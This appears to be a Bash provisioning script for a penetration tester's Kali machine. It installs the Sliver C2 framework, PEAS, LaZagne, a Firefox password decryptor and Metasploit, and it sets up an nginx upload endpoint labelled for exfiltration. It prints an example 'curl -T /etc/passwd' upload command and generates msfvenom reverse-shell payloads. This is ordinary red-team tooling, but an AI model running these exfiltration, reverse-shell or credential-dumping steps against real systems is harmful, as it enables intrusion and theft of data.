#!/bin/bash
source bash_tools.txt

dldir="$HOME/Downloads"
homedir="$HOME"
kit_location="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color
kit_log="${kit_location}/kit_log.txt"


# Catch Ctrl+C and die
trap "echo -e '\nTerminated by Ctrl+C'; exit" SIGINT

# Configure the error_handler function to catch errors. Definied below print_message.
trap 'error_handler $? $LINENO' ERR
#############################################################################

c2_sliver_install() {
    # variable used for saving files
    c2_sliver_download_directory="$dldir/C2Frameworks"

    print_message "green" "sliver: Installing sliver..."

    # Try to install mingw-w64 package for more advanced features
    print_message "green" "sliver: Installing mingw-w64 through apt"
    run_and_log sudo apt install -y mingw-w64

    # Clone source repo
    print_message "green" "sliver: Cloning source and Wiki repos to $c2_sliver_download_directory"
    run_and_log git clone --quiet https://github.com/BishopFox/sliver.git "$c2_sliver_download_directory/sliver.git"
    # Wiki for documentation reference
    run_and_log git clone --quiet https://github.com/BishopFox/sliver.wiki.git "$c2_sliver_download_directory/sliver.wiki.git"

    # Binary releases
    print_message "green" "sliver: Downloading latest pre-compiled binary releases"
    run_and_log wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -qP "$c2_sliver_download_directory"
    run_and_log wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -qP "$c2_sliver_download_directory"
    run_and_log wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_windows.exe -qP "$c2_sliver_download_directory"

    print_message "green" "sliver: Installation complete."
    return 0
}

# Error handling function
# Expects error code as $1 and the $LINENO env variable as $2
error_handler(){
    print_message "red" "Error: ($1) occured on $2"
    #echo "${RED}Error: ($1) occured on $2${NC}"
}



grab_peas() {
    linpeas_sh='https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'
    winpeas_bat='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat'
    winpeas_exe='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe'
    print_message "debug" "sudo mkdir \"${dldir}/PEAS\""
    run_and_log sudo mkdir "${dldir}/PEAS"
    print_message "debug" "sudo wget -qO \"${dldir}/PEAS/linpeas.sh\" \"${linpeas_sh}\""
    run_and_log sudo wget -qO "${dldir}/PEAS/linpeas.sh" "${linpeas_sh}"
    print_message "debug" "sudo chmod +x \"${dldir}/PEAS/linpeas.sh\""
    run_and_log sudo chmod +x "${dldir}/PEAS/linpeas.sh"
    print_message "debug" "sudo wget -qO \"${dldir}/PEAS/winpeas.bat\" \"${winpeas_bat}\""
    run_and_log sudo wget -qO "${dldir}/PEAS/winpeas.bat" "${winpeas_bat}"
    print_message "debug" "sudo wget -qO \"${dldir}/PEAS/winpeas.exe\" \"${winpeas_exe}\""
    run_and_log sudo wget -qO "${dldir}/PEAS/winpeas.exe" "${winpeas_exe}"
}


jon() {
    echo "Doing some work, here's a nice portrait, circa 2022 \n"
    echo "   -    \\\\O"
    echo "  -     /\\  "
    echo " -   __/\\ \`"
    echo "    \`    \\\\, (o)"
    echo "^^^^^^^^^^^\`^^^^^^^^"
    echo "Ol' Jon, kickin' them rocks again \n"
}

msfdb_init() {
    # TODO: Check and make sure the msfdb is actually up and running (msfdb run)
    print_message "info" "Initializing MSF database"
    run_and_log sudo systemctl start postgresql
    run_and_log systemctl status postgresql
    run_and_log sudo msfdb init
    #echo "MSF Database Initialized"
    print_message "green" "MSF Database Initialized"
    print_message "info" "Creating msfconsole.rc file"
    run_and_log cp "${kit_location}/msfconsole.rc" "${HOME}/.msf4/msfconsole.rc"
    print_message "info" "Here is the status of msfdb:"
    run_and_log sudo msfdb status
}

neo4j_init() {
    # TODO: Grab the port/service information and present to the user
    run_and_log sudo mkdir -p /usr/share/neo4j/logs
    run_and_log sudo touch /usr/share/neo4j/logs/neo4j.log
    run_and_log sudo neo4j start
    print_message "green" "Neo4j service initialized"
}

nginx_config() {
    # Used to create an NGINX proxy for apache for web exfiltration 
    run_and_log sudo mkdir -p /var/www/uploads/Exfil
    run_and_log sudo chown -R www-data:www-data /var/www/uploads/Exfil
    run_and_log sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf
    if [[ ! -e "/etc/nginx/sites-enabled/upload.conf" ]]; then
        run_and_log sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
    fi
    run_and_log sudo systemctl restart nginx.service
    run_and_log sudo rm /etc/nginx/sites-enabled/default
    # Usage
    print_message "good" "NGINX has been setup. To test the upload, try:"
    print_message "good" "curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt"
}

exploit_organize() {
    """This is meant to be the main (globa) function holder for the organization of exploits into their respective directories"""
    #TODO: Pull out the directory creation functions and place them within here

    function ad_org {

    }

    function linux_org {

    }


    function windows_org {

    }

}

peas_download() {
    # For the time being - just scrub the PEAS directory and re-obtain
    if [[ -d "${dldir}/PEAS" ]]; then
        # Lol, risky
        print_message "debug" "rm -rf ${dldir}/PEAS"
        run_and_log sudo rm -rf "${dldir}/PEAS"
        print_message "debug" "grab_peas"
        grab_peas
    else
        print_message "debug" "grab_peas"
        grab_peas
    fi
}


# Pass args to this function like so:
#
# print_message [good|bad|info] "message you want output" "additional optional"
#
# Success messages should be "good". Will output with [*] in front
# Failure or error should be "bad". Will output with [!] in front
# Other information should be "info". Will output with [+] in front
# Extra debug-level detail should be "debug". Will output with DEBUG: in front
print_message() {
    # Print the provided message with pretty colors and a datetime stamp
    case $1 in
        good|green|success)
            echo -e "${GREEN}[*] $(date +%Y-%m-%dT%H:%M:%S:%Z) : ${@:2}${NC}\n" | tee -a "${kit_log}"
            ;;
        bad|error|red)
            echo -e "${RED}[!] $(date +%Y-%m-%dT%H:%M:%S:%Z) : ${@:2}${NC}\n" | tee -a "${kit_log}"
            ;;
        info)
            echo -e "${BLUE}[+] $(date +%Y-%m-%dT%H:%M:%S:%Z) : ${@:2}${NC}\n" | tee -a "${kit_log}"
            ;;
        debug)
            if [ "$debug" == "true" ]; then
                echo -e "${BLUE}DEBUG: $(date +%Y-%m-%dT%H:%M:%S:%Z) : ${@:2}${NC}\n" | tee -a "${kit_log}"
            fi
            ;;
        *)
            echo -e "${RED}Invalid message type passed to print_message function: $1${NC}\n" | tee -a "${kit_log}"
            exit 1
            ;;
    esac
}


# Function to run things and log them
# It expects everything passed to it to be a command and its arguements
run_and_log() {
    # If debug, print messages and command output to terminal
    if [ "$debug" == "true" ]; then
        print_message "debug" "RUNNING: ${@}"
        "$@" 2>&1 | tee -a "${kit_log}"
    # If no debug, just put in log
    else
        "$@" >> "${kit_log}" 2>&1
    fi
}

scrub() {
    echo "127.0.0.1 localhost
127.0.1.1   kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters" > /etc/hosts
    print_message "green" "Your /etc/hosts file has been reset"
}


# TODO: Come up with naming convention for shells & organize based off target architecture
# TODO: Add platform and target architecture
# TODO: Make msfvenom payload generation as submethods
# TODO: Jam each step of this into the zenity library, providing a GUI with dropdown for choices at each step!
shell_creation() {
  
  listen_port=6969

  # Get the list of available network interfaces
  interfaces=$(ip -o link show | awk -F': ' '{ print $2 }')

  # Use zenity to display the list and let the user choose an interface
  selected_interface=$(zenity --list --title="Select Network Interface" --text="Choose your network interface:" --column="Interfaces" $interfaces)

  if [[ -z "$selected_interface" ]]; then
    print_message "error" "No interface selected. Exiting."
    exit 1
  fi

  # Get the IP address of the selected interface
  ip_addr=$(ip addr show "$selected_interface" | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')

  if [[ -z "$ip_addr" ]]; then
    print_message "error" "No IP address found for the selected interface. Exiting."
    exit 1
  fi

  print_message "info" "Selected interface is: $selected_interface"
  print_message "info" "Interface address is: $ip_addr"
  print_message "info" "Port being used for shells is $listen_port"
  print_message "good" "                                                   Nice"
  msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/meter_rev_test.elf
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f exe > /tmp/test.exe
  msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f sh > /tmp/test_rev.sh
}


shh() {
  echo "                                                              "
  echo "    88                                                88      "
  echo "    88                                                88      "
  echo "    88                                                88      "
  echo "    88,dPPYba,  88       88  ,adPPYba,  8b,dPPYba,  88      "
  echo "    88P'    '8a 88       88 a8'     '8a 88P'   'Y8  88      "
  echo "    88       d8 88       88 8b       d8 88           88      "
  echo "    88b,   ,a8' '8a,   ,a88 '8a,   ,a8' 88           88      "
  echo "    8Y'Ybbd8''   'YbbdP'Y8  'YbbdP''   88           88      "
  echo "                                                              "
  echo "Never gonna give you up. Never gonna let you down.           "
  echo "Never gonna run around and desert you.                       "
  echo "Never gonna make you cry. Never gonna say goodbye.            "
  echo "Never gonna tell a lie and hurt you.                          "
  echo "                                                              "
}


silence_pcbeep () { # I stop the ridiculous terminal beeping !
    sudo echo -e "blacklist pcspkr" > /etc/modprobe.d/nobeep.conf
    print_message "green" "\n  Terminal Beep Silenced! /etc/modprobe.d/nobeep.conf \n"
}

structure_setup() {
    DIRS=("Linux" "Windows" "ActiveDirectory" "C2Frameworks" "Packages")
    for dir in "${DIRS[@]}"; do
        if [[ -d "${dldir}/${dir}" ]]; then
            print_message "debug" "${dir} FOLDER EXISTS"
        else
            print_message "debug" "Making ${dldir}/${dir}"
            run_and_log mkdir "${dldir}/${dir}"
            print_message "debug" "created the ${dir} directory"
        fi
    done
}


sublime_install() {
    sublime='https://download.sublimetext.com/sublime-text_build-3211_amd64.deb'
    print_message "info" "Installing Sublime text"
    print_message "debug" "wget -qO \"${dldir}/sublime.deb\" \"${sublime}\""
    run_and_log wget -qO "${dldir}/sublime.deb" "${sublime}"
    print_message "debug" "sudo dpkg -i \"${dldir}/sublime.deb\""
    # sudo dpkg -i "${dldir}/sublime.deb"
    dpkg_sublime_install_subproc=$(sudo /bin/bash -c "sudo dpkg -i \"${dldir}/sublime.deb\" 2>&1")
    dpkg_sublime_install_return=$?

    if [ "$dpkg_sublime_install_return" -ne 0 ]; then
        print_message "red" "'sudo dpkg -i \"${dldir}/sublime.deb\"' encountered an error while running. return code: $apt_return_code"
        print_message "red" "'sudo dpkg -i \"${dldir}/sublime.deb\"' stdout:\n$dpkg_sublime_install_subproc"
    else
        print_message "debug" "'sudo dpkg -i \"${dldir}/sublime.deb\"' stdout:\n$dpkg_sublime_install_subproc"
        print_message "green" "Sublime text installed"
    fi

}


system_update() {
    print_message "info" "Beginning System updates, please wait..."
    
    apt_update_subproc=$(sudo /bin/bash -c "sudo apt update -y" 2>&1)
    apt_update_return_code=$?
    
    if [ "$apt_update_return_code" -ne 0 ]; then
        print_message "red" "'apt update' encountered an error while running. 'apt update' return code: $apt_return_code"
        print_message "red" "'apt update' stdout:\n$apt_update_subproc"
    else
        print_message "debug" "'apt update' stdout:\n$apt_update_subproc"
        print_message "debug" "'apt update' ran successfully"
    fi

    apt_upgrade_subproc=$(sudo /bin/bash -c "sudo apt upgrade -y" 2>&1)
    apt_upgrade_return_code=$?
    
    if [ "$apt_upgrade_return_code" -ne 0 ]; then
        print_message "red" "'apt upgrade' encountered an error while running. 'apt upgrade' return code: $apt_return_code"
        print_message "red" "'apt upgrade' stdout:\n$apt_upgrade_subproc"
    else
        print_message "debug" "'apt upgrade' stdout:\n$apt_upgrade_subproc"
        print_message "debug" "'apt upgrade' ran successfully"
    fi

    apt_pip_install_subproc=$(sudo /bin/bash -c "sudo apt install python3-pip -y" 2>&1)
    apt_pip_install_return_code=$?
    
    if [ "$apt_pip_install_return_code" -ne 0 ]; then
        print_message "red" "'apt install python3-pip' encountered an error while running. 'apt install python3-pip' return code: $apt_return_code"
        print_message "red" "'apt install python3-pip' stdout:\n$apt_pip_install_subproc"
    else
        print_message "debug" "'apt install python3-pip' stdout:\n$apt_pip_install_subproc"
        print_message "debug" "'apt install python3-pip' ran successfully"
    fi

    apt_autoremove_subproc=$(sudo /bin/bash -c "sudo apt autoremove -y" 2>&1)
    apt_autoremove_return_code=$?
    
    if [ "$apt_autoremove_return_code" -ne 0 ]; then
        print_message "red" "'apt autoremove' encountered an error while running. 'apt autoremove' return code: $apt_return_code"
        print_message "red" "'apt autoremove' stdout:\n$apt_autoremove_subproc"
    else
        print_message "debug" "'apt autoremove' stdout:\n$apt_autoremove_subproc"
        print_message "debug" "'apt autoremove' ran successfully"
    fi

    sublime_install
    vscodium_install
    tool_install
    tool_update

    print_message "info" "Starting SSH service ..."
    run_and_log sudo service ssh start

    print_message "good" "Finished SYSTEM setup"
}

#Throw test cases into here, invoke with -test
test() {
    #zenity --info --title="Notification" --text="Hello!" --width=200 --height=100
    silence_pcbeep
    shell_creation
}

tool_install() {
    cd "$dldir"
    structure_setup # Decouple me from this function and put me into the organization function
    
    # Temp method to grab lazagne and the old firefox decrypt for python2
    lazagne_exe='https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
    run_and_log sudo wget "$lazagne_exe" -qO "$dldir/lazagne.exe"
    
    ff_decrypt_old='https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip'
    run_and_log sudo wget "$ff_decrypt_old" -qO "$dldir/FirefoxDecrypt_ForPython2"
    
    # End temp method
    
    is_repo_installed() { #Never delete me, this is Kaedraar's wizardry
        if [[ "$1" =~ https://.+/(.+)\.git ]]; then
            if [[ -d "./${BASH_REMATCH[1]}" ]]; then
                return 0
            fi
        else
            print_message "bad" "INVALID URL: $1"
            # Returning 0 here because if the url isn't valid, then we definitely don't want to try installing
            return 0
        fi
        return 1
    }
    
    for git_url in "${GITHUBS[@]}"; do
        print_message "debug" "Checking for local install of: $git_url"
        if is_repo_installed "$git_url"; then
            print_message "good" "Found $git_url in current directory, continuing..."
        else
            run_and_log git clone -q "$git_url"
            if [ $? -eq 0 ]; then
                print_message "green" "Repo cloned: $git_url -- Moving on..."
            else
                print_message "red" "Failed to clone repo $git_url" "Exit code:$?\n"
            fi
        fi
    done
    
    # Begin installing pypi & apt packages
    apt_command_string="sudo /usr/bin/apt install -y "
    for pkg in "${APT_PACKAGES[@]}"; do
        apt_command_string+="$pkg "
    done
    
    apt_install_subproc=$(sudo /bin/bash -c "$apt_command_string" 2>&1)
    apt_return_code=$?
    
    if [ "$apt_return_code" -ne 0 ]; then
        print_message "red" "apt encountered an error while running. apt return code: $apt_return_code"
        print_message "red" "apt stdout:\n$apt_install_subproc"
    else
        print_message "green" "apt installed packages successfully"
    fi
    
    for pkg in "${PYPI_PACKAGES[@]}"; do
        run_and_log pip3 install "$pkg" 1>/dev/null
        print_message "green" "PYPI $pkg successfully installed"
    done
    
    peas_download
    run_and_log sudo ln -s "$dldir/nmapAutomator/nmapAutomator.sh" /usr/local/bin/ && sudo chmod +x "$dldir/nmapAutomator/nmapAutomator.sh"
    
    print_message "green" "tool_install() Completed"
    return 0
}


tool_update() {
    nmap_update() {
        print_message "info" "Updating nmap script database"
        run_and_log sudo nmap --script-updatedb 1>/dev/null
        print_message "green" "nmap script database updated"
    }

    rockyou() {
        print_message "info" "Checking if rockyou has been unzipped..."
        if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            print_message "green" "It hasn't been decompressed - decompressing now..."
            run_and_log sudo gunzip /usr/share/wordlists/rockyou.txt.gz
        else
            print_message "green" "rockyou has already been unzipped"
            print_message "green" "Software & Tool updates have been completed!"
        fi
    }

    print_message "info" "Updating searchsploit DB. Please be patient, this may take a while..."
    run_and_log sudo searchsploit -u
    print_message "green" "Finished searchsploit update"

    print_message "info" "Updating locate DB..."
    run_and_log sudo updatedb
    print_message "green" "Finished locate DB update"

    nmap_update
    rockyou

    return 0
}


vscodium_install() {
    # Download the public GPG key for the repo and package if hasn't been downloaded already
    print_message "info" "Installing VSCodium"
    if [ ! -f '/usr/share/keyrings/vscodium-archive-keyring.gpg' ]; then
        print_message "info" "Downloading and adding VSCodium GPG key to filesystem (within /usr/share/keyrings/)"
        wget -qO - https://gitlab.com/paulcarroty/vscodium-deb-rpm-repo/raw/master/pub.gpg | gpg --dearmor | sudo dd of=/usr/share/keyrings/vscodium-archive-keyring.gpg 2>/dev/null
    else
        print_message "info" "VSCodium GPG key already downloaded"
    fi

    # Add the repository if it hasn't been already
    if [ ! -f '/etc/apt/sources.list.d/vscodium.list' ]; then
        print_message "info" "Adding VSCodium repository to apt repos in /etc/apt/sources.list.d/"
        echo 'deb [ signed-by=/usr/share/keyrings/vscodium-archive-keyring.gpg ] https://paulcarroty.gitlab.io/vscodium-deb-rpm-repo/debs vscodium main' | sudo tee /etc/apt/sources.list.d/vscodium.list
    else
        print_message "info" "VSCodium repository was already added"
    fi

    # Refresh available packages and install codium
    print_message "info" "Installing VSCodium from repository"
    run_and_log sudo apt update
    run_and_log sudo apt install codium -y
    print_message "green" "VSCodium installed"
}
